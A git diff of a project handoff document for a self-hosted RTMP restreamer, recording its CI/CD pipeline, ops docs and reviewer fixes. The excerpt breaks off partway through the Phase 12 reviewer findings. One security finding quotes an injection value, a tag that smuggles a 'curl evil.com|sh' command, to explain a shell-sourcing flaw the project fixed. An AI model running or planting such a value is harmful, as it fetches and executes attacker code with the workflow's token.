@@ -4,13 +4,13 @@
 this project cold, after a context compaction or a fresh conversation.
 Read this first; everything else is reachable from here.
 
-**Last updated:** 2026-05-17
+**Last updated:** 2026-05-17 (post-Phase 12)
 
 **GitHub:** https://github.com/pelmentor/Restream_Plus
-(initial commit `a100f2a` pushed 2026-05-17 covers Phases 0–10;
-local `main` tracks `origin/main`. Author identity is set
-**repo-locally** to `pelmentor <cssnik2013@gmail.com>` — `.git/config`,
-not global.)
+(initial commit `a100f2a` covers Phases 0–10; Phase 11 + Phase 12
+commits local-only — not yet pushed. Author identity set
+**repo-locally** to `pelmentor <cssnik2013@gmail.com>` —
+`.git/config`, not global.)
 
 ---
 
@@ -20,36 +20,48 @@ Self-hosted RTMP restreamer (OBS → server → Twitch / YouTube Live / Kick /
 VK Video Live) with a web control panel, packaged as one Docker image,
 published to GHCR. **Source pushed to
 https://github.com/pelmentor/Restream_Plus** (2026-05-17 initial
-commit covers Phases 0–10). **Design complete. Phases 1 (config + crypto),
-2 (persistence), 3 (auth), 4 (domain), 5 (supervisor + ffmpeg workers
-+ redaction + event bus), 6 (Backend HTTP — REST + WebSocket + health
-+ locked-mode middleware + lifespan + supervisor wiring), 7 (Frontend
-foundation), 8 (Frontend Dashboard — runnable hero / tiles / slide-out
-/ WS-cache patcher / RecentEvents / first-run hint / VK paste mid-flow),
-9 (Frontend Settings — entire surface: 9 tabs + 6 design-system
-components + AuthRepromptHost + 6 new backend endpoints including
-rotate-passphrase with atomic credential re-wrap), and 10 (Container —
-4-stage Dockerfile + nginx.conf + entrypoint + healthcheck + s6
-service tree with init-data oneshot + nginx + control-plane + s6-log
-companion) all implemented, reviewed, audited, and green** — 636
-backend tests (pytest; unchanged from Phase 9 — Phase 10 was pure
-infrastructure), ruff + ruff format + mypy --strict clean; frontend
-typecheck + lint + 9/9 vitest + build all clean at **214 KB gzipped
-vs 256 KB budget**. **Docker is NOT installed on the dev host so
-`docker build` smoke is deferred to Phase 11 CI** — the first venue
-that will actually build the image. Next code phase is Phase 11
-(CI: GHA workflow for build + GHCR publish) per `docs/CODE_PLAN.md`.
+commit covers Phases 0–10; Phase 11 + Phase 12 work is local-only,
+not yet pushed). **Design complete. Phases 1–10 implemented, reviewed,
+audited, pushed to GitHub. Phase 11 (CI/CD — 3 GHA workflows + Renovate
++ hash-pinned lockfiles + cosign-signed multi-arch GHCR publish +
+SLSA provenance + SBOM) implemented, reviewed, audited 2026-05-17.
+Phase 12 (Ops docs — 7 operator-facing docs under `docs/ops/` +
+canonical compose.yaml + 30 invariants S-1..S-30 from SA+BA
+agency-agent synthesis) implemented, reviewed, audited 2026-05-17
+— ready to push (alongside Phase 11).** 636 backend tests still
+green (Phase 12 is pure docs, Phase 11 was pure CI/CD); ruff + ruff
+format + mypy --strict clean; frontend typecheck + lint + 9/9 vitest +
+build all clean at **214 KB gzipped vs 256 KB budget**;
+`docker/requirements.hashes.lock` installs in fresh venv with all 34
+packages hash-verified. **`docker build` runtime smoke still deferred
+— Docker not installed on dev host; first venue that will actually
+run a Docker build is the GHA workflow itself, on first push of
+`.github/workflows/`.** All 12 planned phases of `docs/CODE_PLAN.md`
+are now complete. Carryover items (the deferred follow-ups from
+each phase) are tracked in §"Phase 12 — what landed" §N and the
+phase-N memos.
 
-When resuming: read §"Resume checklist" below, then pick up at
-Phase 11 in `docs/CODE_PLAN.md`.
+When resuming: read §"Resume checklist" below, then push Phase 11
++ Phase 12 commits. Next move is operator-facing — open follow-up
+items below or move toward v1.0.0 tag (which exercises the
+`release.yml` workflow + the release-checklist.md for the first
+time).
 
 ---
 
-## Repository / git state (2026-05-17)
+## Repository / git state (2026-05-17, post-Phase 12)
 
 - **Remote:** `origin → https://github.com/pelmentor/Restream_Plus.git`
 - **Default branch:** `main` (created with `git init -b main`)
 - **Initial commit:** `a100f2a` — 261 files, Phases 0–10.
+- **Local-only since initial commit:** Phase 11 (CI/CD — 3 GHA
+  workflows + Renovate + 4 scripts + 2 hash lockfiles + Dockerfile
+  updates + Phase 11 design memo) and Phase 12 (7 ops docs +
+  `docs/ops/compose.yaml` + Phase 12 design memo + CODE_PLAN +
+  SESSION_HANDOFF + README + architecture-README updates). Neither
+  has been pushed yet. The 3 workflow files only become live after
+  the Phase 11 push; the ops docs are markdown-only and inert until
+  pushed.
 - **Author identity:** `pelmentor <cssnik2013@gmail.com>` — set
   **repo-locally** in `.git/config` (NOT global). Never overwrite
   the global git config; if a teammate clones, they set their own.
@@ -124,8 +136,8 @@ Memory entries live at:
 | 7h. Frontend Phase 8 — Dashboard (hero card + tiles + slide-out + WS subscription)         | ✅ Complete 2026-05-16 | Backend: +1 field `RunStateView.run_state_changed_at` + supervisor tracking + 4 tests (616 total green). Frontend: 19 new files + 3 modified; typecheck + lint + build clean; **168 KB gzipped vs 256 KB budget**; 9/9 Vitest pure-function reducer tests. code-reviewer 2 highs + 3 mediums + 1 low — all applied (H-1 aria-live on button, H-2 useTargets reactivity hole, M-1 password autofill suppress, M-3 double hsl wrap, M-4 slide-out focus return, L-2 RecentEventsMenu Escape). Rule №5 audit clean. See §"Phase 8 — what landed". |
 | 7i. Frontend Phase 9 — Settings (all tabs + 6 design-system components + 6 new backend endpoints) | ✅ Complete 2026-05-16 | Backend: 6 new endpoints (reveal-credential / reveal-ingest-key / rotate-passphrase / GET+DELETE security/sessions / GET /about) + new `REVEAL_INGEST_KEY` scope + 5 new error codes + `KeyMaterial.verify_passphrase`/`rotate_in_place` + repo additions (list_all_for_rewrap/rewrap, list_active_for_user/delete_all, delete_all, list_app_starts) + lifespan tracking of `started_at` + `app_started` audit + 24-h `.kdf_salt.previous` cleanup task; +20 endpoint tests (636 total green) covering rotate-passphrase atomicity injection. Frontend: 36 new files (lib + hooks + components + 9 tabs); typecheck + lint + 9/9 Vitest + build all clean at **214 KB gzipped vs 256 KB budget**. code-reviewer + security-reviewer 1 high + 5 mediums — all applied (H-1 SecretStr for passphrase fields, M-1 rate-limit countdown reset, M-2 sessions assertion fix, M-3 ChangePassword err.code match, M-4 cleanup-loop suppress scope, M-5 unmount plaintext cleanup). Rule №5 audit clean 24/24. See §"Phase 9 — what landed". |
 | 10. Container (Dockerfile, nginx-rtmp build, s6 services, entrypoint)                   | ✅ Complete 2026-05-16 | 4-stage Dockerfile (frontend-builder + nginx-builder + backend-builder + runtime). docker/{nginx.conf, entrypoint.sh, healthcheck.sh, nginx-rtmp.sha, requirements.lock} + s6 tree {init-data oneshot + nginx longrun (with port-poll readiness wrapper) + control-plane longrun + control-plane/log s6-log companion + user/contents.d bundle}. app/main.py adds `_notify_s6_ready()` (write+close fd 3) + explicit `workers=1`. app/config.py flips `healthz_check_nginx` default to True (production-correct); 4 conftests + 1 test fixture opt out. 60 invariants I-A1..I-Q2 in phase-10-design-memo.md (synthesis of Software Architect + Backend Architect agency-agent passes). 636 backend tests still green; ruff + ruff format + mypy --strict clean. code-reviewer (2 criticals + 2 importants + 1 medium) + security-reviewer (2 highs + 4 mediums + 5 lows) — all applied except H2 (pip --require-hashes deferred to Phase 11 with the dep-bump tooling). Rule №5 audit CLEAN (13/13 fixes verified). `docker build` runtime smoke deferred to Phase 11 CI (Docker not installed on dev host). See §"Phase 10 — what landed". |
-| 11. CI (GHA, multi-arch GHCR publish)                                                   | ⏸ Not started | Inherits Phase 10 invariants: SHA-256 build-arg population (DA-6), pip --require-hashes lockfile (DA-5), Renovate/Dependabot bumps, multi-arch build (qemu vs ubuntu-24.04-arm runner tradeoff per I-L4). |
-| 12. Ops docs (deployment, backup/restore, release checklist, maintenance)               | ⏸ Not started | Must cover: docker stop -t 30 (I-D4); /data ownership chown-on-start (§F); nginx-error.log treated as secret (§I); rootless-podman --cap-add NET_BIND_SERVICE (I-G5); bind :1935 to loopback or LAN (never public); /readyz vs /livez probe semantics (§H). |
+| 11. CI (GHA, multi-arch GHCR publish)                                                   | ✅ Complete 2026-05-17 | 3 workflows (ci.yml, build-image.yml, release.yml) + Renovate config + 4 scripts (load-checksums.sh, regenerate-lockfile.sh, refresh-checksums.sh, refresh-nginx-checksum.sh) + .github/checksums.env (5 tarball SHA-256s + 3 version pins) + docker/requirements{,-dev}.hashes.lock (uv --universal --generate-hashes, 885+1223 lines). Dockerfile: pip --no-deps → --require-hashes (DA-5/H2 closure); npm audit signatures added (PB-15); SOURCE_DATE_EPOCH arg (PB-14); NGINX_RTMP_MODULE_SHA bumped from a NON-EXISTENT commit to real v1.2.2 commit (R-14). Multi-arch via native ubuntu-24.04-arm runners (NOT qemu). Cosign keyless OIDC signing on every published image (PA-18). SLSA provenance + per-arch SBOM via docker/build-push-action sbom:true + provenance:mode=max. grype HIGH+ fixable blocks publish. PA-19 tag-immutability gate (authenticated, error-disambiguated). Rule №5 audit CLEAN (14/14 reviewer fixes verified). 636 tests still green. See §"Phase 11 — what landed". |
+| 12. Ops docs (deployment, backup/restore, upgrade, maintenance, release-checklist, branch-protection, ghcr-retention) | ✅ Complete 2026-05-17 | 7 ops docs + canonical `docs/ops/compose.yaml` + `phase-12-design-memo.md` (30 invariants S-1..S-30 from SA+BA agency-agent synthesis). docker stop -t 30 enforced everywhere (S-8); cosign verify command byte-identical in 3 docs (S-9); image tag table byte-identical in 2 docs (S-5); env-var appendix matches `app/config.py` AppSettings (S-6); branch-protection required checks match ci.yml job names (S-7); backup primitive = `sqlite3 .backup` only (S-16); `cp -r /data` only as DO-NOT example. ADR-0005 admin-bootstrap autogen drift discovered + logged as Phase 12 carryover §N.a (ADR promises stdout-printed first-boot password; shipping code requires `RESTREAM_ADMIN_PASSWORD` env var — docs encode shipping reality). code-reviewer (1 critical + 4 high + 1 medium) + security-reviewer (4 high + 6 medium + 1 low) ran in parallel — all 17 applied. Rule №5 audit CLEAN (17/17 grep-verified). 636 backend tests still green (no code touched). See §"Phase 12 — what landed". |
 
 ---
 
@@ -154,12 +166,15 @@ GHA publishes to GHCR.
 
 ## Resume checklist (read in this order)
 
-1. **This file** (`docs/SESSION_HANDOFF.md`) — orientation.
+1. **This file** (`docs/SESSION_HANDOFF.md`) — orientation. The §"Phase
+   11 — what landed" and §"Phase 12 — what landed" sections at the
+   bottom carry the most recent state.
 2. **`docs/CODE_PLAN.md`** — the phased implementation plan with file
-   paths and acceptance criteria. **Pick up at whatever phase is
-   active** (next is Phase 11 — CI: GHA workflow for build + GHCR publish).
+   paths and acceptance criteria. All 12 phases are now ✅ COMPLETE.
+   No "next phase"; next move is operator-facing (see TL;DR at top
+   of this file).
 3. **`docs/architecture/README.md`** — index of 11 ADRs + the design
-   review log.
+   review log + per-phase memos (now includes phase-12-design-memo).
 4. **`docs/architecture/system-overview.md`** — domain language and the
    container-level architecture diagram. Skim if you've never seen it;
    re-read if it's been more than a few hours.
@@ -167,17 +182,41 @@ GHA publishes to GHCR.
    architectural finding from the 4-expert review and how it was
    resolved. Use this when something in the ADRs seems surprising —
    the rationale is here.
-6. **Memory** at `~/.claude/projects/d--Projects-Programming-Restream-Plus/memory/`:
+6. **`docs/architecture/phase-12-design-memo.md`** — the 30
+   invariants S-1..S-30 the ops docs encode. Read before editing any
+   file under `docs/ops/`.
+7. **`docs/ops/`** — operator-facing surface. `deployment.md` is the
+   anchor; the other 6 docs branch from there. `compose.yaml` is the
+   canonical reference compose.
+8. **Memory** at `~/.claude/projects/d--Projects-Programming-Restream-Plus/memory/`:
    - `MEMORY.md` (index)
    - The 5 rule files (especially `rule-no-quick-fixes.md`,
      `rule-no-questions-spawn-agents.md`, and `rule-post-shipping-audit.md`
      for the post-ship verification step).
-7. **The four agency-agent prompts** at `docs/prompts/` — these
+   - `project-restream-plus.md` — full project context including
+     Phase 10/11/12 architectural lock-ins.
+9. **The four agency-agent prompts** at `docs/prompts/` — these
    define how to brief future expert-review subagents. Don't expand
    on them; just re-use them when spawning the agents per Rule №3 / №4.
 
 After this checklist, you should know what state the project is in and
 what to do next without asking the user.
+
+### Most likely "what to do next" answers
+
+a. **Push Phase 11 + Phase 12 commits to GitHub.** Both are local-only.
+   Regular `git push` (no `--force`, no `--no-verify`). The 3 workflow
+   files only become live after this push.
+b. **Cut the first `v1.0.0` tag.** First end-to-end exercise of
+   `release.yml` + `docs/ops/release-checklist.md`. Follow
+   release-checklist.md straight down — every step is testable.
+c. **Pick up an open follow-up** from §"Phase 12 — what landed"
+   bottom (especially ADR-0005 admin-bootstrap autogen drift, which
+   is the only one that's an ADR-vs-code disagreement rather than a
+   pure feature gap).
+d. **Iterate on a specific operator-side concern** (a new reverse-proxy
+   variant, a backup-script variant, etc.) — the design-memo
+   invariants S-1..S-30 are the gates.
 
 ---
 
@@ -2340,22 +2379,467 @@ The same 4 items carried forward (none touched by Phase 10):
 4. **HTTP sessions revoke reprompt** — needs `REVOKE_SESSION` scope
    if we ever go multi-admin.
 
-### Phase 11 entry conditions
+### Phase 11 entry conditions — ALL CLOSED 2026-05-17
 
-Phase 11 (CI: GHA workflow + GHCR publish) inherits these load-bearing
-constraints from Phase 10:
+All Phase 10 → 11 inherited constraints addressed (see §"Phase 11 — what
+landed" below). Phase 12 (Ops docs) inherits from Phase 11 in the same
+way: branch-protection contract (PA-30), GHCR retention policy (PA-31),
+cosign-verify operator command, docker stop -t 30 (Phase 10 I-D4 still
+load-bearing).
 
-- The Dockerfile builds the same way amd64 + arm64. qemu nginx-rtmp
-  build is ~5-10 min per arch (I-L4 risk register).
-- Populate every `*_SHA256` build-arg in CI (DA-6).
-- Replace `requirements.lock` with `pip-compile --generate-hashes`
-  output and flip to `pip install --require-hashes` (DA-5).
-- Add a `getcap /usr/sbin/nginx` smoke test in CI's post-build phase
-  to catch any Dockerfile reorder that loses the cap.
-- Verify image size ≤ 420 MB uncompressed (I-B3 alarm).
-- Renovate / Dependabot config (DEFER-OR-AMEND-4) — weekly bump PRs
-  against `docker/nginx-rtmp.sha`, nginx version, s6-overlay
-  version, Python deps lockfile, base image digests.
+---
+
+## Phase 11 — what landed (2026-05-17)
+
+The CI/CD pipeline. Three GHA workflows + Renovate config + 4 supporting
+scripts + hash-pinned pip lockfiles + tarball SHA-256 store + cosign
+keyless signing + SLSA provenance + per-arch SBOM attestations. Pure
+infrastructure phase — 636 backend tests still green (no new application
+tests).
+
+### Files created
+
+```
+.github/workflows/ci.yml                # PR + main-push gate
+.github/workflows/build-image.yml       # main-push multi-arch GHCR publish
+.github/workflows/release.yml           # tag-push multi-arch GHCR publish
+.github/renovate.json5                  # dep-bump bot config
+.github/checksums.env                   # 5 tarball SHA-256s + 3 version pins
+
+scripts/load-checksums.sh               # validated KEY=VALUE emitter — H3 sec
+scripts/regenerate-lockfile.sh          # uv pip compile wrapper (uv-version-pinned)
+scripts/refresh-checksums.sh            # atomic SHA refresh for nginx/s6/rtmp bumps
+scripts/refresh-nginx-checksum.sh       # manual GPG-verify procedure
+
+docker/requirements.hashes.lock         # 885 lines, universal-platform hashes
+docker/requirements-dev.hashes.lock     # 1223 lines, runtime + dev hashes
+
+docs/architecture/phase-11-design-memo.md
+                                        # 47 invariants PA-1..PA-33 + PB-1..PB-18
+                                        # + 14 R-* convergence resolutions
+```
+
+### Files modified
+
+- `docker/Dockerfile`:
+  - `ARG NGINX_RTMP_MODULE_SHA` bumped `9879e1d...` (Phase 10 — does NOT
+    exist on GitHub; Phase 11 R-14) → `23e1873a...` (v1.2.2 stable
+    release commit). Image actually wouldn't build today without this.
+  - `pip install --no-cache-dir --no-deps -r requirements.lock` →
+    `pip install --no-cache-dir --require-hashes -r requirements.hashes.lock`
+    (DA-5 / Phase 10 H2 security finding closure).
+  - `npm audit signatures` added to frontend-builder after `npm ci` (PB-15).
+  - `ARG SOURCE_DATE_EPOCH=""` added for reproducible image timestamps (PB-14).
+  - Header comment block updated to reflect Phase 11 changes.
+- `pyproject.toml`:
+  - Added `pytest-xdist>=3.6,<4` (CI uses `pytest -n auto`).
+  - Added `hatchling>=1.25,<2` to dev deps — so `pip install
+    --no-build-isolation -e .` in CI reads hatchling from the
+    hash-pinned lockfile, never PyPI directly (L5 sec reviewer).
+- `docs/architecture/README.md`: phase-11-design-memo link added.
+- `docs/CODE_PLAN.md`: Phase 11 marked ✅ COMPLETE with file inventory.
+
+### Files deleted (per Rule №2 — no migration baggage)
+
+- `docker/requirements.lock` → superseded by `docker/requirements.hashes.lock`
+- `docker/nginx-rtmp.sha` → superseded by `.github/checksums.env`
+
+### Design memo first (Rule №3)
+
+Synthesis of **Software Architect** + **Backend Architect** agency-agent
+parallel passes. 22 (SA) + 14 (BA) design dimensions surveyed; 10 G-*
+convergence points + 5 J-* open questions resolved into 14 R-*
+resolutions baked into the memo:
+
+| ID | Decision |
+| --- | --- |
+| R-1 | Hash lockfile tool: `uv pip compile --generate-hashes --universal` |
+| R-2 | `:latest` = last release; `:edge` tracks main (amendment to CODE_PLAN) |
+| R-3 | Native arm64 runners (`ubuntu-24.04-arm`), NOT qemu |
+| R-4 | Cosign keyless OIDC signing in Phase 11 (not deferred) |
+| R-5 | Renovate, not Dependabot (customManagers for checksums.env) |
+| R-6 | grype HIGH+ fixable blocks; only-fixed |
+| R-7 | Smoke failure blocks publish — no :smoke-failed tag |
+| R-8 | Checksums file at `.github/checksums.env` (CI-adjacent) |
+| R-9 | `NGINX_RTMP_MODULE_TREE_SHA` git-tree-hash defense DEFERRED |
+| R-10 | `SOURCE_DATE_EPOCH` from commit timestamp + `rewrite-timestamp=true` |
+| R-11 | `npm audit signatures` in frontend-builder stage |
+| R-12 | Synthetic-RTMP ingest-leak smoke DEFERRED (Phase 5 property test covers) |
+| R-13 | nginx GPG verify is manual, not a CI gate |
+| R-14 | Phase 10 `NGINX_RTMP_MODULE_SHA` bumped to real v1.2.2 commit |
+
+### Reviewer findings — all critical/high applied
+
+**code-reviewer** (2 critical + 4 high + 3 medium + 3 low):
+- **C1** Matrix-output collision between amd64 + arm64 build jobs.
+  Switched to `actions/upload-artifact` + `actions/download-artifact`
+  pattern (digest persisted as filename, merge job assembles from
+  `${runner.temp}/digests/`).
+- **C2** `pr-image-smoke` shared `gha:amd64` cache scope with the
+  production build → PR could poison main's layer cache.
+  Distinct scope `pr-smoke-amd64` (PA-11).
+- **H1** `:latest` v0-asymmetry: major-tag rule excluded v0, latest didn't.
+  Now both rules mirror: `!startsWith(tag, 'v0.') && !contains(tag, '-')`.
+- **H2** Dead artifact upload code (`actions/cache` write with no read) —
+  fixed by C1 rewrite.
+- **H3** `release.yml::Pull just-built image by digest` missing `set -euo
+  pipefail` (parity with build-image.yml). Added.
+- **H4** Renovate's nginx `customManager` used `datasource: docker`
+  (tracks Docker Hub container image, not source tarball). Switched
+  to `datasource: github-tags` against `nginx/nginx` with
+  `extractVersionTemplate: "^release-(?<version>.*)$"`.
+- **M1** Smoke container not reaped on failure path. Added
+  `trap cleanup EXIT` then `trap - EXIT` for happy-path explicit stop.
+- **M3** `regenerate-lockfile.sh` didn't enforce uv version match —
+  silent CI drift. Added `actual_uv != UV_VERSION` exit-non-zero gate.
+- **L1-L3** style/minor — applied or accepted as-is.
+
+**security-reviewer** (3 high + 7 medium + 5 low):
+- **H1** PA-19 tag-immutability gate used `docker manifest inspect`
+  WITHOUT authentication. For private repos, a 401 was treated as
+  "tag absent" — silent PA-19 bypass. Fix: docker login first, then
+  inspect stderr to disambiguate `manifest unknown` (free) vs
+  `unauthorized` (genuine error → fail closed).
+- **H3 + H4** SHELL-INJECTION via `set -a; . .github/checksums.env;
+  set +a` in workflow preflights AND `scripts/refresh-checksums.sh`.
+  A compromised upstream tag named e.g. `v3.2.0.2;curl evil.com|sh#`
+  would inject commands at shell-source time, with the workflow's
+  `GITHUB_TOKEN` scope. Fix: replaced all shell-sourcing of
+  `checksums.env` with `scripts/load-checksums.sh` — a strict
+  KEY=VALUE line parser with per-field regex validation (semver,
+  40-char-hex, 64-char-hex). Used in 8 places across all 3 workflows.
+  `scripts/refresh-checksums.sh` also got strict validation before
+  any curl URL interpolation, with a defense-in-depth re-validation
+  pass after writing.
+- **L2** Empty/malformed merged-manifest digest could cause cosign to
+  sign an unintended ref. Added regex-validated empty-digest guard
+  after `docker buildx imagetools inspect`.
+- **L4** Renovate's github-actions auto-merge group fired immediately
+  on minor/patch releases — a malicious action republish could be
+  auto-merged before the broader community flags it. Added
+  `minimumReleaseAge: "3 days"`.
+- **L5** `pip install -e .` triggers PEP 517 build isolation → pip
+  network-resolves hatchling (the build backend) unhashed. Fix: added
+  `hatchling>=1.25,<2` to dev deps; regenerated lockfile; ci.yml
+  installs via `pip install --no-deps --no-build-isolation -e .` so
+  hatchling comes from the hash-pinned lockfile.
+- **M2** Dead `actions/cache` step (digest persistence) — removed by
+  C1/H2 rewrite to upload/download-artifact.
+- **M4, M7** Documentation-only comments added (SBOM provenance path
+  clarity; smoke `-e RESTREAM_MASTER_PASSPHRASE` log-leak warning).
+- **L1** Renovate `fileFilters` + `commands` coupling doc — comment added.
+- **L3** GPG fingerprint chain doc — minor, deferred.
+
+**Deferred** (logged in memo §N as Phase 12+):
+- **H2 sec** Renovate `postUpgradeTasks` script-pin gate — Mend-hosted
+  Renovate sandboxes safely with `allowedPostUpgradeCommands`; only
+  load-bearing if the project ever switches to self-hosted Renovate.
+- **M3 sec** Crypto-deps no-fix-available CVE scan — Phase 12 ops review.
+- **M5 sec** GHCR retention policy — operator-side config, Phase 12.
+- **M6 sec** False alarm — `find -type f` already excludes symlinks.
+
+### Rule №5 audit — CLEAN
+
+14/14 claimed fixes grep-verified in code:
+
+| Fix | Verification |
+| --- | --- |
+| Matrix outputs → upload/download-artifact (C1, H2, H5c) | 7+ `actions/upload-artifact` + 14+ `actions/download-artifact` + 2 `merge-multiple` references ✓ |
+| PR cache scope `pr-smoke-amd64` (C2) | 2 occurrences in ci.yml ✓ |
+| Tag immutability auth + disambiguation (SR-H1) | `manifest unknown` / `unauthorized` / `authentication required` regex disambiguation in release.yml preflight ✓ |
+| Validated `load-checksums.sh` parser (SR-H3, H4) | 8 references across all 3 workflows; `set -a; . file` patterns ELIMINATED ✓ |
+| `:latest` v0 + pre-release exclusion (CR-H1) | `!startsWith(...'v0.') && !contains(...'-')` in release.yml meta tags ✓ |
+| release.yml smoke pull `set -euo pipefail` (CR-H3) | comment + set -euo pipefail confirmed ✓ |
+| Renovate nginx datasource github-tags (CR-H4) | `datasource: github-tags` + `nginx/nginx` + `extractVersionTemplate: "^release-(?<version>.*)$"` ✓ |
+| Smoke cleanup trap (CR-M1) | `trap cleanup EXIT` in both build-image.yml + release.yml ✓ |
+| uv version enforcement (CR-M3) | `actual_uv != UV_VERSION` check in scripts/regenerate-lockfile.sh ✓ |
+| Dead actions/cache removed (SR-M2) | 0 `actions/cache` references in build-image.yml / release.yml ✓ |
+| Empty-digest guard (SR-L2) | regex `^sha256:[a-f0-9]{64}$` validation after `docker buildx imagetools inspect` ✓ |
+| hatchling in dev deps + lockfile + --no-build-isolation (SR-L5) | pyproject.toml line 46 + lockfile entry + 2 `--no-build-isolation` in ci.yml ✓ |
+| Renovate minimumReleaseAge 3 days (SR-L4) | 2 hits on `minimumReleaseAge: "3 days"` (github-actions + python-deps-runtime) ✓ |
+| SBOM redundancy + smoke -e warning comments (SR-M4, M7) | inline `# PB-9 / PB-10` + `# M7 sec` comments in build-image.yml + release.yml ✓ |
+
+Plus: 636/636 tests pass; ruff + ruff format + mypy --strict clean;
+3 workflow YAMLs parse; `docker/requirements.hashes.lock` installs in
+fresh venv with all 34 packages hash-verified (34 wheels, all `--hash`
+verified by pip).
+
+### Concrete invariants Phase 12 must respect
+
+1. **PA-30 (branch protection contract)**: required status checks are
+   `backend-test`, `backend-lint`, `frontend`, `backend-lockfile`,
+   `workflow-pins`. Phase 12 ops doc `branch-protection.md` documents
+   how to (re-)establish.
+2. **PA-31 (GHCR retention)**: untagged > 30 days deleted; tagged
+   never auto-deleted. Phase 12 ops doc.
+3. **PA-19 (tag immutability)**: `:vX.Y.Z` cannot be overwritten.
+   release.yml preflight enforces; operator should never `--force` or
+   manually delete + re-tag a published version.
+4. **PA-20 (`:latest` semantics)**: `:latest` = last stable release
+   (NOT main HEAD). Phase 12 README + deployment.md must guide
+   operators to prefer `:vX.Y.Z` for production pins; `:edge` for
+   bleeding-edge; `:latest` for "current stable".
+5. **PA-22 / PB-13 (secrets surface)**: only `GITHUB_TOKEN`. No PAT.
+   No `RESTREAM_*` from `secrets`. CI generates ephemeral passphrase
+   via `openssl rand -hex 32`.
+6. **PB-1 / PB-17 (pip --require-hashes)**: ANY future `pip install`
+   in Dockerfile or CI must be `--require-hashes`. No fallback path.
+7. **PA-14 / PA-26 (checksums.env is the single source of truth)**:
+   only `scripts/refresh-checksums.sh` writes the SHA fields. Human
+   edits are emergency-override only.
+8. **SR-H3 (validated parser everywhere)**: any future workflow that
+   reads checksums.env MUST use `scripts/load-checksums.sh`, never
+   `cat` or `. file`.
+9. **R-14 (nginx-rtmp commit pin)**: track tagged releases of
+   `arut/nginx-rtmp-module` (Renovate customManager + `automerge: false`).
+   NEVER pin to a `master` tip without GPG-verifying.
+10. **PA-29 (smoke as `_notify_s6_ready()` proxy)**: HEALTHCHECK going
+    healthy within `--start-period=60s` IS the external proof that
+    fd 3 notification fired. Don't add a separate s6-ready probe.
+
+### Open follow-ups (from Phase 9-10 — still open)
+
+Same 4 items carried forward (none touched by Phase 11):
+
+1. **first-run-complete auto-flip** in supervisor on first successful
+   `live` transition.
+2. **YouTube backup-ingest** toggle — "one target, two workers" model change.
+3. **AuthReprompt grant-expired auto-retry** — one-shot retry wrapper.
+4. **HTTP sessions revoke reprompt** — needs `REVOKE_SESSION` scope
+   if we ever go multi-admin.
+
+Plus Phase 11 → 12 carryovers (logged in phase-11-design-memo.md §N):
+
+5. **Ingest-key leak CI smoke** — Phase 5 property test is the gate;
+   Phase 12 ops verification can add a synthetic RTMP publish path.
+6. **NGINX_RTMP_MODULE_TREE_SHA git-tree-hash defense** — future hardening.
+7. **GPG verify nginx tarball as CI gate** — currently manual.
+8. **arm64 runtime smoke under qemu fallback** — only relevant if
+   `ubuntu-24.04-arm` runner availability degrades.
+9. **GHCR retention policy enforcement** — Phase 12 documents operator action.
+10. **Renovate self-hosted script-pin gate (SR-H2)** — only relevant if
+    self-hosted Renovate is adopted.
+
+---
+
+## Phase 12 — what landed (2026-05-17)
+
+The operator-facing documentation layer. Seven docs under `docs/ops/`
+plus the canonical compose file plus the synthesis design memo. Pure
+docs phase — 636 backend tests still green; no app / workflow code
+touched.
+
+### Files created
+
+```
+docs/ops/deployment.md            # multi-page: docker run + compose + reverse-proxy + verify
+docs/ops/backup-restore.md        # sqlite3 .backup primitive + restore + rotation-vs-backup
+docs/ops/upgrade.md               # schema_version contract + cosign + rollback
+docs/ops/maintenance.md           # weekly / monthly / quarterly / per-incident
+docs/ops/release-checklist.md     # 14-step maintainer flow (pre-tag, tag, verify, publish)
+docs/ops/branch-protection.md     # PA-30 — 5 required checks + gh api recipes
+docs/ops/ghcr-retention.md        # PA-31 — untagged 30 d / tagged forever + verify
+docs/ops/compose.yaml             # canonical reference compose (single SOT)
+
+docs/architecture/phase-12-design-memo.md
+                                  # SA + BA synthesis; 30 invariants S-1..S-30
+```
+
+### Files modified
+
+- `docs/architecture/README.md` — phase-12-design-memo link added.
+- `docs/CODE_PLAN.md` — Phase 12 marked ✅ COMPLETE with file inventory
+  and acceptance criteria.
+- (No code touched.)
+
+### Design memo first (Rule №3)
+
+Synthesis of **Software Architect** + **Backend Architect**
+agency-agent parallel passes. SA produced 22 invariants
+(SA-1..SA-22) focused on info-architecture, single-source-of-truth
+tripwires, doc skeletons, and reversibility. BA produced 30
+invariants (BA-1..BA-30) focused on operator-side threat model,
+secret-handling matrix, backup/upgrade safety, log handling.
+Convergence on all 13 open questions (SA J-1..J-7, BA J-1..J-6);
+synthesized into 30 testable invariants S-1..S-30 in §M of the
+design memo. Phase 11's PA-30 / PA-31 invariants required two
+extra docs (`branch-protection.md`, `ghcr-retention.md`) beyond
+the original CODE_PLAN list of 5 — total 7 docs.
+
+### Codebase fact verification before writing
+
+Verified against shipping code (not the ADRs alone):
+- `SCHEMA_VERSION = 1` is stored as `PRAGMA user_version` (NOT a
+  `meta` table — corrected an early draft of the design memo).
+- The env-var surface in `deployment.md` matches the 11
+  `RESTREAM_*` fields in `app/config.py` `AppSettings`.
+- The 5 required CI job names in `branch-protection.md` match
+  `.github/workflows/ci.yml` exactly: `backend-test`, `backend-lint`,
+  `frontend`, `backend-lockfile`, `workflow-pins`.
+- `release.yml` publishes 5 tags (not 6); `:edge` comes from
+  `build-image.yml` on main push.
+- The first-boot autogen+stdout password promised by ADR-0005
+  §"Bootstrap" does **NOT** exist in shipping `app/db/schema_init.py`
+  — `RESTREAM_ADMIN_PASSWORD` is required on first boot. Logged as
+  Phase 12 carryover §N.a.
+
+### Reviewer findings — all 17 applied
+
+**code-reviewer** (1 critical + 4 high + 1 medium):
+- **C-1** `maintenance.md` backup-verify used `busybox sqlite3` — busybox
+  doesn't ship sqlite3. Replaced with `docker exec restream-plus sqlite3`
+  pattern.
+- **H-1** `deployment.md` verify step expected `127.0.0.1:1935` listen
+  inside container; nginx actually binds `0.0.0.0:1935` inside the
+  namespace (host-side loopback restriction comes from `-p 127.0.0.1:1935:1935`,
+  not from nginx). Fixed the expected-output comment.
+- **H-2** `compose.yaml` `env_file` path was `/etc/restream.env`; every
+  other doc used `/etc/restream/env` (directory + file). Normalized to
+  `/etc/restream/env` across the board.
+- **H-3** `release-checklist.md` claimed `release.yml` publishes 6 tags
+  including `:edge`. Actually it publishes up to 5 (PA-19 + PA-20 rules);
+  `:edge` comes from `build-image.yml`. Fixed.
+- **H-4** `maintenance.md` "I'm locked out" suggested `docker restart …
